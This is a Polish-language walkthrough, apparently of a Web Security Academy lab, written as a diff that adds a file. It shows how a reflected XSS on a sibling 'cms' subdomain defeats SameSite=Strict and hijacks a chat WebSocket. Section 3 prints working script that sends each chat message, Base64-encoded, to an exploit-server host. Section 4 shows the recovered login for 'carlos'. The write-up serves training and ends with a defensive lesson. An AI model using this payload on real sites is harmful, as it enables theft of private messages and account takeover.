@@ -1,0 +1,82 @@
+To był łańcuch trzech elementów:
+
+  Reflected XSS na domenie cms
+  → obejście SameSite=Strict
+  → przejęcie WebSocketu i historii czatu
+  → logowanie jako carlos
+
+  ## 1. Dlaczego zwykły atak nie działał?
+
+  Ciasteczko sesyjne miało:
+
+  SameSite=Strict
+
+  Dlatego WebSocket otwarty bezpośrednio ze zwykłego exploit servera nie otrzymałby ciasteczka ofiary.
+
+  Jednak przeglądarka rozpatruje SameSite na podstawie głównej domeny, a nie pełnego originu:
+
+  0a470023...web-security-academy.net
+  cms-0a470023...web-security-academy.net
+
+  To różne originy, ale ta sama site: web-security-academy.net.
+
+  ## 2. XSS na domenie siostrzanej
+
+  Domena CMS była podatna na reflected XSS:
+
+  https://cms-0a47002303a8fd2a8012214600ea0059.web-security-academy.net/login
+
+  Parametr username był wstawiany do HTML bez kodowania:
+
+  /login?username=<script>...</script>&password=x
+
+  Kod uruchomiony na cms-... był dla SameSite traktowany jako pochodzący z tej samej site co główna
+  aplikacja.
+
+  ## 3. Przejęcie historii czatu
+
+  Przez XSS wykonałem kod podobny do:
+
+  <script>
+  let ws = new WebSocket(
+    "wss://0a47002303a8fd2a8012214600ea0059.web-security-academy.net/chat"
+  );
+
+  ws.onopen = () => {
+    ws.send("READY");
+  };
+
+  ws.onmessage = event => {
+    fetch(
+      "https://exploit-0a6400880383fd8480e52097016f00af.exploit-server.net/leak?d=" +
+      encodeURIComponent(btoa(event.data)),
+      {mode: "no-cors"}
+    );
+  };
+  </script>
+
+  Wiadomość:
+
+  READY
+
+  powodowała przesłanie całej historii czatu. Każdą odpowiedź zakodowałem Base64 i wysłałem do logów
+  exploit servera.
+
+  ## 4. Odzyskane dane
+
+  W historii znajdowała się wiadomość:
+
+  No problem carlos, it's 0ptfx0fpnpva5zojz88z
+
+  Czyli:
+
+  username: carlos
+  password: 0ptfx0fpnpva5zojz88z
+
+  Zalogowałem się tymi danymi i otworzyłem /my-account, co ustawiło status:
+
+  Solved
+
+  Najważniejsza lekcja: SameSite=Strict nie chroni przed atakiem rozpoczętym na podatnej domenie
+  siostrzanej. XSS na jednym subdomenowym originie może zagrozić innym aplikacjom znajdującym się w tej
+  samej site.
